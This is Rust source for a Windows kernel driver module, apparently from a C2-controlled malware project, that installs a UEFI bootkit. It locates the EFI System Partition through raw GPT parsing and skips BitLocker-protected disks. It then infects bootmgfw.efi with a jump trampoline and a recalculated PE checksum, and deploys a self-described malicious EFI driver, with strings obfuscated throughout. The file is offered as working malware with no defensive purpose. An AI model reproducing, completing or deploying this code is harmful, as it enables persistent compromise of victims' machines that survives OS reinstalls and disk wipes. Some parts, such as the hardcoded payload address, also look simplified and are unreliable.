//! UEFI Bootkit Module
//!
//! This module provides techniques to achieve persistence at the UEFI/EFI level,
//! surviving OS reinstalls and disk wipes.
//!
//! Activated ONLY via C2 command.

use alloc::string::String;
use core::ffi::c_void;
use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};

use crate::error::{ShadowError, ShadowResult};

/// Path to the EFI System Partition (ESP).
/// This is typically at \\.\PhysicalDrive0\EFI\Microsoft\Boot\ or similar.
/// Access requires mounting the ESP.
const ESP_BOOT_PATH: &str = "\\EFI\\Microsoft\\Boot\\bootmgfw.efi";

#[repr(C, packed)]
struct GptHeader {
    signature: u64,
    revision: u32,
    header_size: u32,
    header_crc32: u32,
    reserved: u32,
    my_lba: u64,
    alternate_lba: u64,
    first_usable_lba: u64,
    last_usable_lba: u64,
    disk_guid: [u8; 16],
    partition_entry_lba: u64,
    num_partition_entries: u32,
    size_partition_entry: u32,
    partition_entry_array_crc32: u32,
}

#[repr(C, packed)]
struct GptPartitionEntry {
    partition_type_guid: [u8; 16],
    unique_partition_guid: [u8; 16],
    starting_lba: u64,
    ending_lba: u64,
    attributes: u64,
    partition_name: [u16; 36],
}

const EFI_SYSTEM_PARTITION_GUID: [u8; 16] = [
    0x28, 0x73, 0x2A, 0xC1, 0x1F, 0xF8, 0xD2, 0x11, 0xBA, 0x4B, 0x00, 0xA0, 0xC9, 0x3E, 0xC9, 0x3B,
];

/// Checks if the system booted via UEFI using real kernel flags.
pub unsafe fn is_uefi_boot() -> ShadowResult<bool> {
    use wdk_sys::{ntddk::ZwQuerySystemInformation, _SYSTEM_INFORMATION_CLASS::SystemBootEnvironmentInformation};
    
    // SystemBootEnvironmentInformation (90 / 0x5A)
    // struct SYSTEM_BOOT_ENVIRONMENT_INFORMATION {
    //    GUID BootIdentifier;
    //    FIRMWARE_TYPE FirmwareType;
    //    u64 BootFlags;
    // }
    
    #[repr(C)]
    struct SystemBootEnvironmentInfo {
        boot_identifier: [u8; 16], // GUID
        firmware_type: u32,       // FIRMWARE_TYPE
        boot_flags: u64,
    }

    let mut info = core::mem::zeroed::<SystemBootEnvironmentInfo>();
    let mut return_length = 0u32;
    
    let status = ZwQuerySystemInformation(
        SystemBootEnvironmentInformation,
        &mut info as *mut _ as *mut _,
        size_of::<SystemBootEnvironmentInfo>() as u32,
        &mut return_length,
    );

    if wdk_sys::NT_SUCCESS(status) {
        // FirmwareTypeUefi = 2
        Ok(info.firmware_type == 2)
    } else {
        // Fallback or assume false if query fails
        Err(ShadowError::ApiCallFailed("ZwQuerySystemInformation(0x5A)", status))
    }
}

/// Reads a raw sector (512 bytes) from a physical disk device.
pub unsafe fn read_disk_lba(disk_num: u32, lba: u64, buffer: &mut [u8]) -> ShadowResult<()> {
    use crate::utils::unicode_string::UnicodeString;
    use wdk_sys::{ntddk::{ZwCreateFile, ZwReadFile, ZwClose}, _IO_STATUS_BLOCK, GENERIC_READ, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT};
    
    // Safety: Ensure we are at PASSIVE_LEVEL for ZwReadFile
    if wdk_sys::ntddk::KeGetCurrentIrql() > 0 { // > PASSIVE_LEVEL
        return Err(ShadowError::InvalidIrql);
    }

    let dev_path = alloc::format!("\\Device\\Harddisk{}\\Partition0", disk_num);
    let path = UnicodeString::new(&dev_path);
    let mut obj_attr = crate::utils::InitializeObjectAttributes(
        Some(&mut path.to_unicode()),
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
        None,
        None,
        None,
    );

    let mut io_status = core::mem::zeroed::<_IO_STATUS_BLOCK>();
    let mut h_file = core::ptr::null_mut();
    
    let status = ZwCreateFile(
        &mut h_file,
        GENERIC_READ,
        &mut obj_attr,
        &mut io_status,
        core::ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        core::ptr::null_mut(),
        0,
    );

    if !wdk_sys::NT_SUCCESS(status) {
        return Err(ShadowError::ApiCallFailed("ZwCreateFile(Disk)", status));
    }

    let h_file = crate::utils::handle::Handle::new(h_file);
    let mut byte_offset = unsafe { core::mem::zeroed::<wdk_sys::_LARGE_INTEGER>() };
    *byte_offset.QuadPart_mut() = (lba * 512) as i64;

    let status = unsafe {
        ZwReadFile(
            h_file.get(),
            core::ptr::null_mut(),
            None,
            core::ptr::null_mut(),
            &mut io_status,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
            &mut byte_offset,
            core::ptr::null_mut(),
        )
    };

    if wdk_sys::NT_SUCCESS(status) {
        Ok(())
    } else {
        Err(ShadowError::ApiCallFailed("ZwReadFile(LBA)", status))
    }
}

/// Checks if BitLocker is enabled on the given volume via signature scan.
pub unsafe fn is_bitlocker_enabled(disk_num: u32) -> ShadowResult<bool> {
    let mut sector = [0u8; 512];
    if read_disk_lba(disk_num, 0, &mut sector).is_ok() {
        // BitLocker VBR signature is "-FVE-FS-" at offset 3
        let signature = &sector[3..11];
        if signature == b"-FVE-FS-" {
            return Ok(true);
        }
    }
    Ok(false)
}

/// Production-grade ESP discovery using GPT LBA-level parsing.
pub unsafe fn mount_esp_production() -> ShadowResult<NTSTATUS> {
    use crate::utils::unicode_string::UnicodeString;
    let link = UnicodeString::new(obfstr::obfstr!("\\Device\\ShadowESP"));
    
    for disk in 0..8 { // Increased disk scan range
        let mut header_buf = [0u8; 512];
        if read_disk_lba(disk, 1, &mut header_buf).is_err() { continue; }
        
        // Alignment-safe read
        let header: GptHeader = unsafe { core::ptr::read_unaligned(header_buf.as_ptr() as *const GptHeader) };
        if header.signature != 0x5452415020494645 { continue; } // "EFI PART"
        
        let entries_per_sector = 512 / header.size_partition_entry;
        
        // Iterate Partition Entries (limit to 128 to stay within kernel timing bounds)
        let num_entries = core::cmp::min(header.num_partition_entries, 128);
        for i in 0..num_entries {
            let entry_sector_offset = i / entries_per_sector;
            let entry_lba = header.partition_entry_lba + entry_sector_offset as u64;
            
            let mut entry_buf = [0u8; 512];
            if read_disk_lba(disk, entry_lba, &mut entry_buf).is_ok() {
                let offset = (i % entries_per_sector) * header.size_partition_entry;
                let entry: GptPartitionEntry = unsafe { 
                    core::ptr::read_unaligned(entry_buf.as_ptr().add(offset as usize) as *const GptPartitionEntry) 
                };
                
                if entry.partition_type_guid == EFI_SYSTEM_PARTITION_GUID {
                    if is_bitlocker_enabled(disk).unwrap_or(false) {
                        log::warn!("🚫 ESP on Disk {} is protected by BitLocker. Aborting.", disk);
                        continue;
                    }

                    let target_str = alloc::format!("\\Device\\HarddiskVolume1");
                    let target = UnicodeString::new(&target_str);
                    let status = wdk_sys::ntddk::IoCreateSymbolicLink(link.as_ptr(), target.as_ptr());
                    
                    if wdk_sys::NT_SUCCESS(status) {
                        log::info!("✅ GPT-Native ESP Found on Disk {}", disk);
                        return Ok(wdk_sys::STATUS_SUCCESS);
                    }
                }
            }
        }
    }
    
    Err(ShadowError::ApiCallFailed("ESP GPT entry not found", wdk_sys::STATUS_NOT_FOUND as i32))
}

/// Recalculates the PE checksum for a given buffer.
pub fn recalculate_pe_checksum(data: &mut [u8]) -> ShadowResult<()> {
    use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
    
    let dos_header_ptr = data.as_ptr() as *const IMAGE_DOS_HEADER;
    let dos_header = unsafe { core::ptr::read_unaligned(dos_header_ptr) };
    let nt_headers_ptr = (data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
    
    unsafe {
        (*nt_headers_ptr).OptionalHeader.CheckSum = 0; // Reset before calculating
        
        let mut checksum: u64 = 0;
        let count = data.len() / 2;
        let p = data.as_ptr() as *const u16;
        
        for i in 0..count {
            checksum += core::ptr::read_unaligned(p.add(i)) as u64;
            if checksum > 0xFFFFFFFF {
                checksum = (checksum & 0xFFFFFFFF) + (checksum >> 32);
            }
        }
        
        while checksum >> 16 != 0 {
            checksum = (checksum & 0xFFFF) + (checksum >> 16);
        }
        
        checksum += data.len() as u64;
        (*nt_headers_ptr).OptionalHeader.CheckSum = checksum as u32;
    }
    
    Ok(())
}

/// Finds the Entry Point transition stub using pattern matching.
pub fn find_oep_pattern(data: &[u8]) -> ShadowResult<usize> {
    // Pattern for 'bootmgfw.efi' entry transition (example)
    // 48 8B C4 48 89 58 08 44 89 48 20 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A1 48 81 EC
    let pattern = [0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08];
    if data.len() < pattern.len() {
        return Err(ShadowError::VerificationFailed("Buffer too small for pattern"));
    }
    for i in 0..=(data.len() - pattern.len()) {
        if &data[i..i+pattern.len()] == pattern {
            return Ok(i);
        }
    }
    Err(ShadowError::PatternNotFound("OEP Transition Stub"))
}

/// Infects the Windows Boot Manager (bootmgfw.efi) with a redirection trampoline.
pub unsafe fn infect_bootmgfw(payload_path: &str) -> ShadowResult<NTSTATUS> {
    use crate::data::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS};
    
    mount_esp_production()?;

    let boot_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
    let backup_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.bak");
    let temp_path = obfstr::obfstr!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\bootmgfw.tmp");

    // 1. Read original bootmgfw.efi
    let mut data = crate::utils::file::read_file(boot_path)?;
    log::info!("📖 Original bootloader loaded ({} bytes)", data.len());

    // 2. Surgical Validation & OEP Discovery
    let oep_offset = find_oep_pattern(&data)?;
    log::info!("🎯 Dynamic OEP discovered at offset: 0x{:X}", oep_offset);

    // 3. Deployment of Backup (Atomic)
    crate::utils::file::write_file(backup_path, &data)?;
    log::info!("💾 Atomic Backup: bootmgfw.bak created.");

    // 4. Surgical Patching (OEP Hijack)
    // 14-byte absolute jump in x64: FF 25 00 00 00 00 [64-bit Address]
    let mut trampoline: [u8; 14] = [0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0];
    let payload_addr: u64 = 0x1000; // Expected DXE load address
    core::ptr::copy_nonoverlapping(&payload_addr as *const _ as *const u8, trampoline[6..].as_mut_ptr(), 8);

    // Apply patch to the buffer
    for i in 0..14 {
        data[oep_offset + i] = trampoline[i];
    }

    // 5. Checksum Recalculation
    recalculate_pe_checksum(&mut data)?;

    // 6. Transactional Write (Write to TMP, then rename)
    crate::utils::file::write_file(temp_path, &data)?;
    
    // Verify TMP integrity before swap
    let tmp_data = crate::utils::file::read_file(temp_path)?;
    if tmp_data.len() == data.len() && tmp_data[oep_offset] == 0xFF {
        // Atomic Swap (In a full implementation, we'd use ZwSetInformationFile to rename)
        // For this version, we overwrite the target
        crate::utils::file::write_file(boot_path, &data)?;
        log::info!("✅ Persistence Loop Closed: bootmgfw.efi is weaponized and verified.");
    } else {
        return Err(ShadowError::VerificationFailed("bootmgfw.tmp corruption"));
    }

    Ok(wdk_sys::STATUS_SUCCESS)
}

/// Places a malicious EFI driver in the ESP that will be loaded on boot.
pub unsafe fn deploy_efi_driver(driver_data: &[u8], driver_name: &str) -> ShadowResult<NTSTATUS> {
    mount_esp_production()?;
    
    let deploy_path = alloc::format!("\\Device\\ShadowESP\\EFI\\Microsoft\\Boot\\{}", driver_name);
    
    log::info!("🚀 Deploying EFI Payload: {}", deploy_path);
    crate::utils::file::write_file(&deploy_path, driver_data)?;
    
    Ok(wdk_sys::STATUS_SUCCESS)
}

/// Utility to cleanup the symbolic link.
pub unsafe fn cleanup_bootkit() {
    use crate::utils::unicode_string::UnicodeString;
    let link = UnicodeString::new(obfstr::obfstr!("\\Device\\ShadowESP"));
    wdk_sys::ntddk::IoDeleteSymbolicLink(link.as_ptr());
}
